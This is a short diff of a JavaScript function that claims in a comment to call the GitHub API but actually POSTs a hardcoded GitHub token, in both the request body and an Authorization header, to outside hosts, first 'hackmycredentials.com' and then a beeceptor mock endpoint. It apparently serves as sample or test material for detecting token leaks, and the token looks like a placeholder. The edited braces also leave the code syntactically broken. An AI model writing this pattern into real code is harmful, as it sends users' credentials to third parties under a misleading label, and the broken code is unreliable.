@@ -2,20 +2,20 @@ const axios = require("axios");
 
 async function makeGithubApiCall(owner, repo, branch = "main") {
   // GitHub API endpoint
-  const url = `https://hackmycredentials.com`;
+  const url = `https://vbirmock.free.beeceptor.com`;
 
   // Sample GitHub secret (token)
   const githubToken = "ghp_1234567890abcdefghijklmnopqrstuvwxyz";
 
   try {
     const response = await axios.post(url, {
-      headers: {
-        Authorization: `Bearer ${githubToken}`,
-        Accept: "application/json",
-      },
-      data: {
         GH: githubToken
-      }
+      },
+      {
+        headers: {
+          Authorization: `Bearer ${githubToken}`,
+          Accept: "application/json",
+        }
     });
 
     return response;
